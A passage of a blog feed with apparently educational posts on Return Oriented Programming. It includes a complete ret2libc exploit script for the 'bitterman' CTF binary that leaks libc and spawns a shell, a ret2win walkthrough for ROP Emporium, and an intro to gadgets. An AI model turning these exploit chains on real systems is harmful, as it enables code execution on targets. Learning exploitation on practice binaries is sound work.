<strong>GOT</strong> <code>puts</code> i.e. <code>0x400520</code> and <code>0x600c50</code> respectively.</p><h5 id="The-Gadget"><a href="#The-Gadget" class="headerlink" title="The Gadget"></a>The Gadget</h5><p>For finding a gadget, I will use radare2’s <code>/R &lt; instruction &gt;</code> command to find a <code>pop rdi; ret;</code> gadget.</p><pre><code>[0x00400590]&gt; /R pop rdi  0x00400853                 5f  pop rdi  0x00400854                 c3  ret</code></pre><p>Let’s copy the address i.e. <code>0x400853</code>.</p><p>Let’s make the exploit:-</p><p>First off, we have <code>pop_rdi</code> gadget address and <strong>PLT</strong> and <strong>GOT</strong> <code>puts</code> address.</p><pre><code>from pwn import * # importing fuctions #context(terminal=[&#39;gnome-terminal&#39;,&#39;new-window&#39;]) Debug purpose#context.log_level = &#39;DEBUG&#39; # Debug purposep = process(&#39;./bitterman&#39;) # using bitterman elf # processing the target elf#p = gdb.debug(&#39;./bitterman&#39;,&#39;b main&#39;) # breakpoint setup at main via gdbplt_put = p64(0x400520) # PLT put address got_put = p64(0x600c50) # GOT put addresspop_rdi = p64(0x400853) # pop_rdi addresspadding = &quot;A&quot;*152 # Because we know the offset from earlierpayload = padding +  pop_rdi + got_put + plt_put p.recvuntil(&quot;name?&quot;) # recieve data until we recieve the stringp.sendline(&quot;robin&quot;)  # send data p.recvuntil(&quot;message:&quot;) # recieve data until we recieve the stringp.sendline(&quot;1024&quot;) # send data p.recvuntil(&quot;text:&quot;) # recieve data until we recieve the stringp.sendline(payload) # send datap.recvuntil(&quot;Thanks!&quot;) # recieve data until we recieve the stringleaked_puts = p.recv()[:8].strip().ljust(8,&quot;\x00&quot;) # recieving the string until we get leaked address and padding with null bytes to length of 8log.success(&quot;Leaked puts: %s&quot; %(leaked_puts)) # Prints the leaked addresssp.interactive() # keeps the shell interactive</code></pre><p>This script pretty much explains everything with comments. So, let’s see what we get after running this:-</p><pre><code>[+] Starting local process &#39;./bitterman&#39;: pid 3117[*] &#39;/home/robin/ROP-Emporium/libc.so.6&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled[+] Leaked puts: ��E\x92\x87\x7f\x00\x00[*] Switching to interactive mode</code></pre><p>Great, we now have the leaked address, we need to find the offset which will be constant for every address. So, let’s start carfting our <strong>ret2libc</strong> attack.</p><h1 id="Stage-2-Final-Exploit-using-ret2libc"><a href="#Stage-2-Final-Exploit-using-ret2libc" class="headerlink" title="Stage 2: Final Exploit using ret2libc"></a>Stage 2: Final Exploit using ret2libc</h1><p>So, from the previous exploit we get the leaked address. Now we need to find the offset and execute the <code>/bin/sh</code> to spawn a shell.</p><p>First off, we need <code>main</code> address because the leak address will be changed everytime so we need to get main address so we can use the leaked address to get the offset for current process.<br>Using <code>objdump -D bitterman | grep main</code>, we will grab the address of the bitteman’s <code>main</code>.</p><pre><code>-snip--00000000004006ec &lt;main&gt;:--snip--</code></pre><p>Nice, we have the main address. Let’s proceed further for crafting the exploit. </p><blockquote><p>Warning: Before we proceeds, we need the <code>libc.so.6</code> of your machine. Copy it with <code>cp //lib/x86_64-linux-gnu/libc.so.6 .</code> , it willcopy the<code>libc.so.6</code> to the working directory.</p></blockquote><p>Now, we will automate the finding of addresses of <code>put</code> and <code>system</code>  with pwntools but beforehand we need <code>/bin/sh</code> address as well. To find that, let’s use strings <code>strings -a -t x libc.so.6 | grep /bin/sh</code> , we will get the address of <code>/bin/sh</code> from the <code>libc.so.6</code>.</p><p>Let’s make the exploit:-</p><pre><code>#!/usr/bin/pythonfrom pwn import * # importing fuctions #context(terminal=[&#39;gnome-terminal&#39;,&#39;new-window&#39;]) Debug purpose#context.log_level = &#39;DEBUG&#39; # Debug purposep = process(&#39;./bitterman&#39;) # using bitterman elf # processing the target elf#p = gdb.debug(&#39;./bitterman&#39;,&#39;b main&#39;) # breakpoint setup at main via gdblibc = ELF(&#39;libc.so.6&#39;)plt_put = p64(0x400520) # PLT put address got_put = p64(0x600c50) # GOT put addresspop_rdi = p64(0x400853) # pop_rdi addressplt_main = p64(0x4006ec)padding = &quot;A&quot;*152 # Because we know the offset from earlierpayload = padding +  pop_rdi + got_put + plt_put + plt_mainp.recvuntil(&quot;name?&quot;) # recieve data until we recieve the stringp.sendline(&quot;robin&quot;)  # send data p.recvuntil(&quot;message:&quot;) # recieve data until we recieve the stringp.sendline(&quot;1024&quot;) # send data p.recvuntil(&quot;text:&quot;) # recieve data until we recieve the stringp.sendline(payload) # send datap.recvuntil(&quot;Thanks!&quot;) # recieve data until we recieve the stringleaked_puts = p.recv()[:8].strip().ljust(8,&quot;\x00&quot;) # recieving the string until we get leaked address and padding with null bytes to length of 8log.success(&quot;Leaked puts: %s&quot; %(leaked_puts)) # Prints the leaked addresssleaked_puts = u64(leaked_puts) # converts to 64-bit friendly integeroffset = leaked_puts - libc.symbols[&#39;puts&#39;] # Thssys = p64(offset + libc.symbols[&#39;system&#39;])sh = p64(offset + 0x1b3e9a)payload = padding+ p64(0x0000000000400509) + pop_rdi + sh + sys # remove p64(0x0000000000400509) if you&#39;re not using ubuntup.sendline(&quot;robin&quot;)p.recvuntil(&quot;message:&quot;)p.sendline(&quot;1024&quot;)p.recvuntil(&quot;text:&quot;)p.sendline(payload)p.recvuntil(&quot;Thanks!&quot;)p.interactive()</code></pre><p><strong>This will spawn a shell and hence you learned how to do a ret2libc attack</strong>.<br>In a nutshell, we used the leak address to find the offset and hence using the gadget we overwrite the instruction pointer while calling the <code>system</code> and <code>/bin/sh</code> hence spawning a shell.</p><pre><code>robin@oracle:~/ROP$ python exploit2.py[+] Starting local process &#39;./bitterman&#39;: pid 12562[*] &#39;/home/robin/ROP-Emporium/libc.so.6&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled[+] Leaked puts: ��3\x84�\x00[*] Switching to interactive mode$ iduid=1000(robin)</code></pre><h1 id="Final-Words"><a href="#Final-Words" class="headerlink" title="Final Words"></a>Final Words</h1><p>Thanks to <a href="https://twitter.com/__lord_idiot" target="_blank" rel="noopener">@Lord_Idiot</a> for helping me out with the stack alignment issue.</p><h5 id="The-MOVAPS-issue"><a href="#The-MOVAPS-issue" class="headerlink" title="The MOVAPS issue"></a>The MOVAPS issue</h5><hr><p>If you’re using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned before returning to GLIBC functions such as printf() and system(). The version of GLIBC packaged with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. The 64 bit calling convention requires the stack to be 16 byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.</p><hr><p>That was it. Until then, <strong>pwn</strong>.</p><h5 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h5><p>Bitterman: <a href="https://github.com/ctfs/write-ups-2015/raw/master/camp-ctf-2015/pwn/bitterman-300/bitterman" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/raw/master/camp-ctf-2015/pwn/bitterman-300/bitterman</a></p>]]></content>
      
      
      <categories>
          
          <category> Return Oriented Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop, pwn, ret2libc, bof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP- Basic Exploit Creation</title>
      <link href="/2019/07/26/rop-tools-usage/"/>
      <url>/2019/07/26/rop-tools-usage/</url>
      
        <content type="html"><![CDATA[<p>This blog post will teach you basics of ROP i.e. how to use tools efficilently.</p><h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>This post is more practical, so tag along with radare2, pwntools, gdb and ropper ready. I’m using <a href="https://ropemporium.com/binary/ret2win.zip" target="_blank" rel="noopener">this</a> binary from ROP-Emporium and it’s a basic one to start with. Grab it and read further.</p><h1 id="The-EIP-and-RIP-Register"><a href="#The-EIP-and-RIP-Register" class="headerlink" title="The EIP and RIP Register"></a>The EIP and RIP Register</h1><p>I’m starting off with IP register i.e. Instruction Pointer in 16-bit mode, Extended Instruction Pointer in 32-bit architecture and RIP in 64-bit. It contains the address of next instruction that will be executed hence, controlling the flow of command. Consider this register as something that will have the control of program flow since it has the next instruction which has to be executed.</p><h1 id="Analysis-of"><a href="#Analysis-of" class="headerlink" title="Analysis of"></a>Analysis of</h1><p>Let’s run the binary and see what it says. </p><pre class=" language-bash"><code class="language-bash">robin@oracle:~/ROP-Emporium$ ./ret2winret2win by ROP Emporium64bitsFor my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer<span class="token punctuation">;</span>What could possibly go wrong?You there madam, may I have your input please? And don<span class="token string">'t worry about null bytes, we'</span>re using fgets<span class="token operator">!</span><span class="token operator">></span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASegmentation fault <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span></code></pre><p>Using bunch of “<strong>A</strong>s” we can see we got a segmentation fault that means we got a buffer overflow that means there is no bound checking. Let’s analyze the binary and see where is the input is overflowed.</p><p>As the first post contained radare2 as a resource for analysis of binary. Starting off with that, type <code>rabin2 -I ret2win</code> to get the information about the binary.</p><pre class=" language-bash"><code class="language-bash">robin@oracle:~/ROP-Emporium$ rabin2 -I ret2winarch     x86binsz    7071bintype  elfbits     64canary   <span class="token boolean">false</span>class    ELF64crypto   <span class="token boolean">false</span>endian   littlehavecode <span class="token boolean">true</span>intrp    /lib64/ld-linux-x86-64.so.2lang     clinenum  <span class="token boolean">true</span>lsyms    <span class="token boolean">true</span>machine  AMD x86-64 architecturemaxopsz  16minopsz  1nx       <span class="token boolean">true</span>os       linuxpcalign  0pic      <span class="token boolean">false</span>relocs   <span class="token boolean">true</span>relro    partialrpath    NONEstatic   <span class="token boolean">false</span>stripped <span class="token boolean">false</span>subsys   linuxva       <span class="token boolean">true</span></code></pre><p>From above we now know that it’s x86 arcitercture and a 64-bit ELF and endianess is set to little. Now, let’s run <code>r2 ret2win</code> and see what functions it has.</p><pre class=" language-bash"><code class="language-bash">robin@oracle:~/ROP-Emporium$ r2 ret2win<span class="token punctuation">[</span>0x00400650<span class="token punctuation">]</span><span class="token operator">></span> aaaa<span class="token punctuation">[</span>x<span class="token punctuation">]</span> Analyze all flags starting with sym. and entry0 <span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> Analyze len bytes of instructions <span class="token keyword">for</span> references <span class="token punctuation">(</span>aar<span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> Analyze <span class="token keyword">function</span> calls <span class="token punctuation">(</span>aac<span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> Emulate code to <span class="token function">find</span> computed references <span class="token punctuation">(</span>aae<span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> Analyze consecutive <span class="token keyword">function</span> <span class="token punctuation">(</span>aat<span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> Constructing a <span class="token keyword">function</span> name <span class="token keyword">for</span> fcn.* and sym.func.* functions <span class="token punctuation">(</span>aan<span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> Type matching analysis <span class="token keyword">for</span> all functions <span class="token punctuation">(</span>afta<span class="token punctuation">)</span><span class="token punctuation">[</span>0x00400650<span class="token punctuation">]</span><span class="token operator">></span> afl0x00400000    2 64           loc.imp.__gmon_start0x00400041    1 171          fcn.004000410x004005a0    3 26           sym._init0x004005d0    1 6            sym.imp.puts0x004005e0    1 6            sym.imp.system0x004005f0    1 6            sym.imp.printf0x00400600    1 6            sym.imp.memset0x00400610    1 6            sym.imp.__libc_start_main0x00400620    1 6            sym.imp.fgets0x00400630    1 6            sym.imp.setvbuf0x00400640    1 6            sub.__gmon_start___248_6400x00400650    1 41           entry00x00400680    4 50   -<span class="token operator">></span> 41   sym.deregister_tm_clones0x004006c0    3 53           sym.register_tm_clones0x00400700    3 28           sym.__do_global_dtors_aux0x00400720    4 38   -<span class="token operator">></span> 35   entry1.init0x00400746    1 111          sym.main0x004007b5    1 92           sym.pwnme0x00400811    1 32           sym.ret2win0x00400840    4 101          sym.__libc_csu_init0x004008b0    1 2            sym.__libc_csu_fini0x004008b4    1 9            sym._fini<span class="token punctuation">[</span>0x00400650<span class="token punctuation">]</span><span class="token operator">></span> </code></pre><p>So, we have a <code>sym.ret2win</code>, <code>sym.pwnme</code> and a <code>sym.main</code> which will be our focus for the rest. Since it’s a ROP challenge and checking the functions one by one with <code>pdf @sym.ret2win</code> in radare2 shell. </p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>0x00400650<span class="token punctuation">]</span><span class="token operator">></span> pdf @sym.ret2win/ <span class="token punctuation">(</span>fcn<span class="token punctuation">)</span> sym.ret2win 32<span class="token operator">|</span>   sym.ret2win <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">|</span>           0x00400811      55             push rbp<span class="token operator">|</span>           0x00400812      4889e5         mov rbp, rsp<span class="token operator">|</span>           0x00400815      bfe0094000     mov edi, str.Thank_you__Here_s_your_flag: <span class="token punctuation">;</span> 0x4009e0 <span class="token punctuation">;</span> <span class="token string">"Thank you! Here's your flag:"</span> <span class="token punctuation">;</span> const char * <span class="token function">format</span><span class="token operator">|</span>           0x0040081a      b800000000     mov eax, 0<span class="token operator">|</span>           0x0040081f      e8ccfdffff     call sym.imp.printf         <span class="token punctuation">;</span> int printf<span class="token punctuation">(</span>const char *format<span class="token punctuation">)</span><span class="token operator">|</span>           0x00400824      bffd094000     mov edi, str.bin_cat_flag.txt <span class="token punctuation">;</span> 0x4009fd <span class="token punctuation">;</span> <span class="token string">"/bin/cat flag.txt"</span> <span class="token punctuation">;</span> const char * string<span class="token operator">|</span>           0x00400829      e8b2fdffff     call sym.imp.system         <span class="token punctuation">;</span> int system<span class="token punctuation">(</span>const char *string<span class="token punctuation">)</span><span class="token operator">|</span>           0x0040082e      90             nop<span class="token operator">|</span>           0x0040082f      5d             pop rbp\           0x00400830      c3             ret</code></pre><p>We see that there is a string with <strong>/bin/cat flag.txt</strong> and a system function call of C, in case you don’t know what <code>system</code> does, it executes the arguments as bash command. </p><p>Since we want to jump to address <code>0x00400811</code> in order to execute above function which will print our flag. In order to execute this we need to find the offset that we need to overwrite the instruction pointer. In this case, it is a 64-bit ELF we have to find <strong>RIP</strong> if it was 32-bit ELF we had to find <strong>EIP</strong>. Let’s try to create a pattern offset uding gdb.</p><pre class=" language-bash"><code class="language-bash">robin@oracle:~/ROP-Emporium$ gdb ret2winGNU gdb <span class="token punctuation">(</span>Ubuntu 8.1-0ubuntu3<span class="token punctuation">)</span> 8.1.0.20180409-gitCopyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> 2018 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">></span>This is <span class="token function">free</span> software: you are <span class="token function">free</span> to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type <span class="token string">"show copying"</span>and <span class="token string">"show warranty"</span> <span class="token keyword">for</span> details.This GDB was configured as <span class="token string">"x86_64-linux-gnu"</span><span class="token keyword">.</span>Type <span class="token string">"show configuration"</span> <span class="token keyword">for</span> configuration details.For bug reporting instructions, please see:<span class="token operator">&lt;</span>http://www.gnu.org/software/gdb/bugs/<span class="token operator">></span>.Find the GDB manual and other documentation resources online at:<span class="token operator">&lt;</span>http://www.gnu.org/software/gdb/documentation/<span class="token operator">></span>.For help, <span class="token function">type</span> <span class="token string">"help"</span><span class="token keyword">.</span>Type <span class="token string">"apropos word"</span> to search <span class="token keyword">for</span> commands related to <span class="token string">"word"</span><span class="token punctuation">..</span>.Reading symbols from ret2win<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.gdb-peda$ pattern_create 100<span class="token string">'AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>gdb-peda$ pattern_create 100 inputWriting pattern of 100 chars to filename <span class="token string">"input"</span>gdb-peda$ r <span class="token operator">&lt;</span> inputStarting program: /home/robin/ROP-Emporium/ret2win <span class="token operator">&lt;</span> inputret2win by ROP Emporium64bitsFor my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer<span class="token punctuation">;</span>What could possibly go wrong?You there madam, may I have your input please? And don<span class="token string">'t worry about null bytes, we'</span>re using fgets<span class="token operator">!</span><span class="token operator">></span> Program received signal SIGSEGV, Segmentation fault.</code></pre><h5 id="Command-Explaination"><a href="#Command-Explaination" class="headerlink" title="Command Explaination"></a>Command Explaination</h5><ul><li><code>gdb ret2win</code> : This will open the gdb with ret2win binary for the processing.</li><li><code>pattern_create 100 input</code> : This will create a offset pattern of the length provided, in our case it’s 100. <code>input</code> is the file where the offset willbe written.</li><li><code>r &lt; input</code> : This will run the binary ret2win and gives the <code>input</code> file as input.</li></ul><h1 id="Analyzing-the-offsets"><a href="#Analyzing-the-offsets" class="headerlink" title="Analyzing the offsets"></a>Analyzing the offsets</h1><p>Let’s see the peda’s work and informatio it provided us:-</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>RAX: 0x7fffffffde10 <span class="token punctuation">(</span><span class="token string">"AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAb"</span><span class="token punctuation">)</span>RBX: 0x0 RCX: 0x1f RDX: 0x7ffff7dd18d0 --<span class="token operator">></span> 0x0 RSI: 0x7fffffffde10 <span class="token punctuation">(</span><span class="token string">"AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAb"</span><span class="token punctuation">)</span>RDI: 0x7fffffffde11 <span class="token punctuation">(</span><span class="token string">"AA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAb"</span><span class="token punctuation">)</span>RBP: 0x6141414541412941 <span class="token punctuation">(</span><span class="token string">'A)AAEAAa'</span><span class="token punctuation">)</span>RSP: 0x7fffffffde38 <span class="token punctuation">(</span><span class="token string">"AA0AAFAAb"</span><span class="token punctuation">)</span>RIP: 0x400810 <span class="token punctuation">(</span><span class="token operator">&lt;</span>pwnme+91<span class="token operator">></span>:    ret<span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x0 R9 <span class="token keyword">:</span> 0x0 R10: 0x602010 --<span class="token operator">></span> 0x0 R11: 0x246 R12: 0x400650 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>R13: 0x7fffffffdf20 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x400809 <span class="token operator">&lt;</span>pwnme+84<span class="token operator">></span>:    call   0x400620 <span class="token operator">&lt;</span>fgets@plt<span class="token operator">></span>   0x40080e <span class="token operator">&lt;</span>pwnme+89<span class="token operator">></span>:    nop   0x40080f <span class="token operator">&lt;</span>pwnme+90<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x400810 <span class="token operator">&lt;</span>pwnme+91<span class="token operator">></span>:    ret       0x400811 <span class="token operator">&lt;</span>ret2win<span class="token operator">></span>:    push   rbp   0x400812 <span class="token operator">&lt;</span>ret2win+1<span class="token operator">></span>:    mov    rbp,rsp   0x400815 <span class="token operator">&lt;</span>ret2win+4<span class="token operator">></span>:    mov    edi,0x4009e0   0x40081a <span class="token operator">&lt;</span>ret2win+9<span class="token operator">></span>:    mov    eax,0x0<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffde38 <span class="token punctuation">(</span><span class="token string">"AA0AAFAAb"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0x7fffffffde40 --<span class="token operator">></span> 0x400062 --<span class="token operator">></span> 0x1f8000000000000 0016<span class="token operator">|</span> 0x7fffffffde48 --<span class="token operator">></span> 0x7ffff7a05b97 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+231<span class="token operator">></span>:    mov    edi,eax<span class="token punctuation">)</span>0024<span class="token operator">|</span> 0x7fffffffde50 --<span class="token operator">></span> 0x1 0032<span class="token operator">|</span> 0x7fffffffde58 --<span class="token operator">></span> 0x7fffffffdf28 --<span class="token operator">></span> 0x7fffffffe2b4 <span class="token punctuation">(</span><span class="token string">"/home/robin/ROP-Emporium/ret2win"</span><span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffde60 --<span class="token operator">></span> 0x100008000 0048<span class="token operator">|</span> 0x7fffffffde68 --<span class="token operator">></span> 0x400746 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span>0056<span class="token operator">|</span> 0x7fffffffde70 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x0000000000400810 <span class="token keyword">in</span> pwnme <span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>In 64-bit binaries we can see the RIP doesn’t contain our sequence. In 64-bit, it will not pop a value into RIP if it cannot actually jump to the address and execute it. So the value is at top of the stack after popping to RIP failed. So from above we can see that RSP has the pattern, we can get value from it. As we can see it has a value of <strong>“AA0AAFAAb”</strong> at the time of segment fault.</p><p>Time to find the padding we need in order to execute the instruction properly. Using peda:-</p><pre><code>gdb-peda$ pattern_offset AA0AAFAAbAA0AAFAAb found at offset: 40</code></pre><h1 id="Creating-Exploit"><a href="#Creating-Exploit" class="headerlink" title="Creating Exploit"></a>Creating Exploit</h1><p>Now, we have all we need to execute the exploit. Now let’s craft the exploit.<br>We need the memory address of RIP and the padding length and python, of course.</p><p>Using pwntools to craft exploit:-</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token comment" spellcheck="true"># Importing all functions from pwntools</span>prog <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2win"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Opening ret2win library</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token comment" spellcheck="true"># padding</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00400824</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Address of "push rbp" from sym.pwnme</span>open<span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Writing the payload to fie payload.</span></code></pre><p>Now, run the exploit:-</p><pre class=" language-bash"><code class="language-bash">robin@oracle:~/ROP-Emporium$ python ret2win.py<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./ret2win'</span><span class="token keyword">:</span> pid 9089<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopped process <span class="token string">'./ret2win'</span> <span class="token punctuation">(</span>pid 9089<span class="token punctuation">)</span>robin@oracle:~/ROP-Emporium$ ./ret2win <span class="token operator">&lt;</span> payloadret2win by ROP Emporium64bitsFor my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer<span class="token punctuation">;</span>What could possibly go wrong?You there madam, may I have your input please? And don<span class="token string">'t worry about null bytes, we'</span>re using fgets<span class="token operator">!</span><span class="token operator">></span> ROPE<span class="token punctuation">{</span>a_placeholder_32byte_flag<span class="token operator">!</span><span class="token punctuation">}</span></code></pre><p>Bam, we read the flag by pushing the <code>pop rbp</code> address to RIP hence executing our payload.</p><p>Follow me on <a href="https://twitter.com/d4mianwayne" target="_blank" rel="noopener">twitter</a> for more ROP contents.</p>]]></content>
      
      
      <categories>
          
          <category> Return Oriented Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop, pwn, radare2, pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to ROP</title>
      <link href="/2019/07/24/rop-introduction/"/>
      <url>/2019/07/24/rop-introduction/</url>
      
        <content type="html"><![CDATA[<p>This blog post will let you know about the ROP or Return Oriented Programming. </p><h1 id="What-is-ROP"><a href="#What-is-ROP" class="headerlink" title="What is ROP?"></a>What is ROP?</h1><p>Return Oriented Programming is a modern method of exploiting a binary that will allow us to take control of the stack and the abuse program’s control flow by the help of gadgets.<br>Often times, this technique is used to exploit a binary which takes input without bound checking that will result in overflow of the memory in which the input is being stored resulting in segmentation fault.<br>This method is only used when we have handful of gadgets i.e. instruction sequences ending with <strong>“ret”</strong> or byte <strong>“c3”</strong>.</p><h1 id="Prerequisities"><a href="#Prerequisities" class="headerlink" title="Prerequisities"></a>Prerequisities</h1><p>Since, this method of exploitation is based on analyzation of functions and memory address which requires some basic reverse engineering and understanding of assembly language.</p><p>So, for reverse engineering you can refer to following resources in order to learn ROP.</p><ul><li><a href="https://medium.com/@jacob16682/reverse-engineering-using-radare2-588775ea38d5" target="_blank" rel="noopener">Reverse Engineering with radare2</a></li><li><a href="https://medium.com/@rickharris_dev/reverse-engineering-using-linux-gdb-a99611ab2d32" target="_blank" rel="noopener">Reverse Engineering with gdb</a></li></ul><p>As of now, I’ve only included radare2 and gdb which is going to be used for this series.</p><p>For Assembly, you can refer the follwoings:-</p><ul><li><a href="http://www.cs.princeton.edu/courses/archive/spr17/cos217/lectures/13_Assembly1.pdf" target="_blank" rel="noopener">Assembly Language Guide 1</a></li><li><a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html" target="_blank" rel="noopener">Assembly Language Guide 2</a></li></ul><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>This can be a little long because <strong>the more the merrier</strong>.</p><p>First off, we need something to analyze the binary.</p><h5 id="Radare2"><a href="#Radare2" class="headerlink" title="Radare2"></a>Radare2</h5><p>If you’ve ever tried binary analysis and reverse enginnering you must have come across radare2, which is a great binary analysis CLI tool and it has a built-in <strong>gadget</strong> finder.</p><h5 id="GDB-PEDA"><a href="#GDB-PEDA" class="headerlink" title="GDB-PEDA"></a>GDB-PEDA</h5><p>This is Python Exploit Development Assitance plugin for GDB which can be found <a href="https://github.com/longld/peda" target="_blank" rel="noopener">here</a>.</p><h5 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h5><p>This is absolutely a great python library which will help you with execution of your exploit by providing helpful functions, which can be get from <a href="https://github.com/arthaud/python3-pwntools" target="_blank" rel="noopener">here</a>.</p><h5 id="Ropper"><a href="#Ropper" class="headerlink" title="Ropper"></a>Ropper</h5><p>This is also a great tool for finding gadgets within a binary, which can be obtained from <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">here</a>.</p><h1 id="Finding-Gadgets"><a href="#Finding-Gadgets" class="headerlink" title="Finding Gadgets"></a>Finding Gadgets</h1><p>From my experience as of now, I’ve used <strong>ropper</strong> and radare2’s built-in function <strong>/R &lt; instruction &gt;</strong>. With the use of these two tools you’ll have the gadgets which will help you in bypassing DEP(Data Execution Prevention) hence, executing your payload.</p><h3 id="Use-of-gadgets"><a href="#Use-of-gadgets" class="headerlink" title="Use of gadgets"></a>Use of gadgets</h3><p>So, as of now you know that in order to build a ROP chain we have to get the binary’s corresponding gadgets. Now, I’ll tell you what is the <strong>exact</strong> use of gadget is.</p><h5 id="Loading-Constants-to-Register"><a href="#Loading-Constants-to-Register" class="headerlink" title="Loading Constants to Register"></a>Loading Constants to Register</h5><p>With the help of ropper or radare2 you can find the <code>pop</code> instruction with a <code>ret</code> which can be used to store a constant into stack for further use.<br>Let a gadget be <code>pop edi, ret</code>, this will pop the <code>edi</code> register value from the stack and return the address to top of the stack.</p><h6 id="System-Call"><a href="#System-Call" class="headerlink" title="System Call"></a>System Call</h6><p>System call i.e. <code>int 0x80</code> followed by <code>ret</code> instruction can be used to interrupt a kernel call that we have setup using previous gadget.<br>Following are the system call gadgets:-</p><ul><li><code>int 0x80; ret</code></li><li><code>call gs:[0x10]; ret</code></li></ul><h3 id="Gadget-to-lookout"><a href="#Gadget-to-lookout" class="headerlink" title="Gadget to lookout"></a>Gadget to lookout</h3><p>There are some gadget which are better left alone i.e. we need to avoid these gadgets in order to avoid corruption of the stack frames.</p><ul><li>Gadgets with <code>pop ebp; ret</code> will mess our stack frames.</li><li>Gadgets ending in pop ebp followed by ret or have the instruction pop ebp. Will also mess up our stack frame.</li></ul><p>Sometimes these gadgets dont affect the overall execution of ROP shell. It depends on the execution<br>flow and will it be interrupted by changing the frame pointer.</p><h1 id="Continuing-the-series"><a 